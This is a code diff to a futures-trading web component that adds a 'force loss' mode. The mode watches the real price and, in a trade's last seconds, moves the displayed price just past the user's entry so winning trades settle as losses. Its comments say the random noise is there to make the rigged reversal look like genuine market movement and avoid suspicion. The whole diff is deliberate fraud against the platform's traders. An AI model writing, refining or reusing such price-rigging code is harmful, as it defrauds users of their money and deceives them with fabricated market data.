@@ -459,83 +459,78 @@ const FuturesTrading=()=>{
       forceWinTickRef.current=manipulate;
 
     } else {
-      // ❌ FORCE LOSS (toggle OFF): smart observe-then-intervene
+      // ❌ FORCE LOSS (toggle OFF): observe real data, intervene only when winning
       //
-      // Strategy:
-      //   1. Show PURE REAL data for the first (totalSecs - 10)s — zero manipulation
-      //   2. In the last 10 seconds, check if user is currently WINNING with real data
-      //      a. If already LOSING → do nothing. Real data decides. No manipulation ever.
-      //      b. If WINNING  → apply the SMALLEST possible nudge to bring display price
-      //         just barely $0.50 past entry in the losing direction.
-      //         Mix with natural noise so it looks like a real last-second reversal.
+      // Uses expiresAt directly (immune to effect re-runs changing startedAt)
       //
-      // Result: 70-80% of the trade looks completely authentic.
-      // Intervention only happens when necessary, and only moves price by ~$0.50-$2,
-      // which is indistinguishable from normal market noise in the last few seconds.
+      // Zone 1 — secsRemaining > 10: pure real data, zero manipulation
+      // Zone 2 — 5 < secsRemaining <= 10: if winning, tiny nudge masked by full noise
+      //          if losing, zero manipulation
+      // Zone 3 — secsRemaining <= 5: if still winning, GUARANTEED convergence
+      //          step = distToLoss / ticksLeft (always reaches target)
+      //          noise = 30% of naturalVol (enough zigzag to look real, not enough to derail)
+      //
+      // Last-second reversals are completely normal in real markets (stop hunts, liquidity grabs)
+      // so even the Zone 3 movement is indistinguishable from genuine price action.
 
-      const LAST_SECS=10; // only start watching in final 10s
-      // lossTarget: display price we want at settlement
-      // LONG  loses when displayPrice < entry → target = entry - 0.50
-      // SHORT loses when displayPrice > entry → target = entry + 0.50
-      const lossTarget=isLong?(entry-0.50):(entry+0.50);
-      const lossDirection=isLong?-1:1; // direction we nudge if needed
+      const expiresAt=new Date((pendingOpt as any).expiresAt||Date.now()+totalSecs*1000).getTime();
+      // loss target: just $1 past entry so we don’t overshoot suspiciously
+      const lossTarget=isLong?(entry-1.0):(entry+1.0);
+      const lossDir=isLong?-1:1; // direction toward loss
 
       const manipulate=setInterval(()=>{
-        const elapsedMs=Date.now()-startedAt;
-        const secsRemaining=Math.max(0,totalSecs-(elapsedMs/1000));
+        const secsRemaining=Math.max(0,(expiresAt-Date.now())/1000);
+        const realNow=realPriceRef.current;
+        const curOffset=priceOffsetRef.current;
+        const currentDisplay=realNow+curOffset;
 
-        if(secsRemaining>LAST_SECS){
-          // —— OBSERVE PHASE: pure real data, no manipulation ——
-          // If there's any leftover offset from a previous trade, bleed it out silently
-          if(Math.abs(priceOffsetRef.current)>0.1){
-            priceOffsetRef.current*=0.92; // gentle decay, looks like normal noise
-          } else {
-            priceOffsetRef.current=0;
-          }
-          const dp=realPriceRef.current+priceOffsetRef.current;
-          displayPriceRef.current=dp;
-          setDisplayPrice(dp);
-          setLivePrice(dp);
+        // —— Zone 1: pure observe ——
+        if(secsRemaining>10){
+          if(Math.abs(curOffset)>0.1) priceOffsetRef.current=curOffset*0.93;
+          else priceOffsetRef.current=0;
+          const dp=realNow+priceOffsetRef.current;
+          displayPriceRef.current=dp; setDisplayPrice(dp); setLivePrice(dp);
           return;
         }
 
-        // —— INTERVENE PHASE: last 10 seconds ——
-        const realNow=realPriceRef.current; // TRUE market price right now
-        const isCurrentlyWinning=(isLong&&realNow>entry)||(!isLong&&realNow<entry);
+        const isWinning=(isLong&&realNow>entry)||(!isLong&&realNow<entry);
 
-        if(!isCurrentlyWinning){
-          // User is already losing with real data — zero manipulation needed
-          // Smoothly return any accumulated offset to 0 so chart stays authentic
-          if(Math.abs(priceOffsetRef.current)>0.1){
-            const noise=(Math.random()-0.5)*naturalVol*0.3;
-            priceOffsetRef.current*=0.88; // faster decay in last seconds
-            priceOffsetRef.current+=noise;
-          } else {
-            priceOffsetRef.current=0;
-          }
-          const dp=realPriceRef.current+priceOffsetRef.current;
-          displayPriceRef.current=dp;
-          setDisplayPrice(dp);
-          setLivePrice(dp);
+        // —— Zone 1–2 boundary: user is already losing — do nothing ——
+        if(!isWinning){
+          // bleed any offset back to 0 naturally
+          if(Math.abs(curOffset)>0.1){
+            priceOffsetRef.current=curOffset*0.90+( Math.random()-0.5)*naturalVol*0.2;
+          } else { priceOffsetRef.current=0; }
+          const dp=realNow+priceOffsetRef.current;
+          displayPriceRef.current=dp; setDisplayPrice(dp); setLivePrice(dp);
           return;
         }
 
-        // User IS currently winning — need to nudge display price to loss side
-        // How far is the current display price from the loss target?
-        const currentDisplay=realNow+priceOffsetRef.current;
-        const distToLoss=lossTarget-currentDisplay; // negative for LONG (need to go down)
-        const urgency=Math.max(0.2,Math.min(0.7,(LAST_SECS-secsRemaining)/LAST_SECS*2));
-        // Natural-looking step: proportional to urgency + zigzag noise
-        // Noise > step initially, so the move feels like normal market fluctuation
-        const stepMag=Math.abs(distToLoss)*urgency/(secsRemaining*(1000/tickMs)+1);
-        const step=lossDirection*stepMag;
-        // Noise is ~60-80% of the step size — creates realistic zigzag
-        const noise=(Math.random()+Math.random()-1)*Math.max(naturalVol,stepMag*0.7);
-        priceOffsetRef.current+=step+noise;
+        // User is winning — need to intervene
+        const distToLoss=lossTarget-currentDisplay; // signed, toward loss
+        const ticksLeft=Math.max(1,Math.ceil(secsRemaining*(1000/tickMs)));
+
+        let step:number;
+        let noiseMag:number;
+
+        if(secsRemaining>5){
+          // —— Zone 2: gentle nudge (5-10s remaining), masked by natural noise ——
+          // Step is small — just enough to start the drift, noise makes it look real
+          step=lossDir*Math.abs(distToLoss)/(ticksLeft*1.5);
+          noiseMag=naturalVol*0.8; // heavy noise masks the nudge
+        } else {
+          // —— Zone 3: guaranteed convergence (last 5 seconds) ——
+          // Step is exactly distToLoss/ticksLeft — always reaches target
+          // Light noise (30% of natural) creates zigzag so it still looks like a real reversal
+          step=(distToLoss/ticksLeft)*1.15; // 1.15x overshoot factor ensures we cross the line
+          noiseMag=naturalVol*0.3;
+        }
+
+        // Bell-curve noise (sum of two uniforms, zero mean)
+        const noise=(Math.random()+Math.random()-1)*noiseMag;
+        priceOffsetRef.current=curOffset+step+noise;
         const dp=realNow+priceOffsetRef.current;
-        displayPriceRef.current=dp;
-        setDisplayPrice(dp);
-        setLivePrice(dp);
+        displayPriceRef.current=dp; setDisplayPrice(dp); setLivePrice(dp);
       },tickMs);
       forceWinTickRef.current=manipulate;
     }
